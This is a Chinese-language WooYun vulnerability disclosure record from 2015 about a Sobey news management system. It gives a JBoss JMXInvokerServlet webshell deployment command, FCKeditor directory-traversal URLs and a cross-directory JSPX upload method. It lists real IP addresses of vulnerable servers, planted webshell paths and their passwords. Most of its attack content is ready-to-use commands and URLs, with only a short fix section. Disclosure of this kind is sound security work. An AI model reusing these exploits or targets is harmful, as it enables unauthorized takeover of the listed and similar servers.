{"id": 32443, "wybug_id": "wooyun-2015-0111231", "wybug_title": "Sobey某新闻系统通用型漏洞打包", "wybug_corp": "索贝数码科技股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-05-08 18:52", "wybug_open_date": "2015-06-22 18:54", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 任意文件上传+文件遍历 详细说明：  成都索贝数码科技股份有限公司，成立于1997年，由1988年成立的成都科大时达电子研究所（CKD）和1993年成立的深圳索贝科技有限公司合并重组而成。公司注册资本8000万元,是国内广播电视行业规模最大的软件开发及系统集成的领军企业，是国内首屈一指的、能够提供总体解决方案专业设计和咨询的服务商。在多次刷洞的过程中都遇到了该厂商的新闻管理系统，这次把问题一起提出，希望能够通过1#任意文件上传(方式1)问题原因jboss未正常配置，导致可通过http://*/invoker/JMXInvokerServlet等方式getshell，jboss的getshell方法很多，而该套新闻系统均采用jboss作为中间件，导致了问题的产生以http://113.200.74.240:8080/news为例\nhttp://113.200.74.240:8080/invoker/JMXInvokerServlet\n\n\n小马地址：http://113.200.74.240:8080/myname/woo.jsp一句话：http://113.200.74.240:8080/myname/wooyun.jsp密码：woo0yun\n\n拿shell过程简单再提供以下几个案例复现jboss上传\njava -jar jboss_exploit_fat.jar -i http://*/invoker/JMXInvokerServlet invoke jboss.admin:service=DeploymentFileRepository store myname.war woo .jsp $content$ true -s java.lang.String;java.lang.String;java.lang.String;java.lang.String;java.lang.Boolean\nhttp://113.200.74.236:8080/news/http://113.200.74.236:8080/invoker/JMXInvokerServlet\n\nhttp://113.200.74.236:8080/myname/woo.jsp\n\nhttp://113.200.74.231:8080/news/http://113.200.74.231:8080/invoker/JMXInvokerServlet\n\n\n\nhttp://113.142.30.83:8080/news/http://113.142.30.83:8080/invoker/JMXInvokerServlet\n\nhttp://113.142.30.83:8080/myname/woo.jsp\n\n等等，有些系统的shell要用不同的姿势拿，本文这里不对jboss拿shell的方法过多的评论   漏洞证明：  2#文件遍历，可以算是全版本问题原因：fck编辑器\nhttp://*/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://113.200.74.169:8080/news/http://113.200.74.169:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\n\nhttp://113.200.74.240:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://113.200.74.236:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://113.200.74.231:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://113.142.30.83:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://113.200.74.146:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://113.142.30.17:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../因为操作简单，所以不一一截图了3#任意文件上传问题原因，fck编辑器未正确配置，完全未进行任何配置，但有一点要注意，上传的文件夹不在站点的路径下，所以我们要跨文件夹上传http://113.142.30.17:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://113.142.30.17:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\nhttp://*/news/widgets/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://*/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n\n\n比如我这个站，\nCurrentFolder=../jboss-4.0.5.GA/server/default/deploy/infoshare-news.war\n我在根目录下传了wooyun.jsp,访问后会跳转，放弃wooyun.jspx显示报了个错wooyun.jspf勉强显示文本\n\n最后发现传jspx马还是可以连接的一句话：http://113.142.30.17:8080/news/wooyun1.jspx密码：0t2t3\n\n\n\n该一句话已删除简而言之，结合fck遍历找到站点路径跨目录传jspx，shell即可,抓包后可得到poc，即下面的测试代码以下案例供重现http://113.142.30.17:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://113.142.30.17:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\nhttp://113.200.74.169:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://113.200.74.169:8080/news/widgets/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connectorhttp://113.200.74.240:8080/news/http://113.200.74.236:8080/news/http://113.200.74.231:8080/news/http://113.142.30.83:8080/news/http://113.200.74.146:8080/news/\n其实直接套用poc就好，如果重新抓包，记得把参数Type值放空，否则会上传失败   修复方案：  正确配置jbossfck上传点过滤正确配置fck编辑器   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}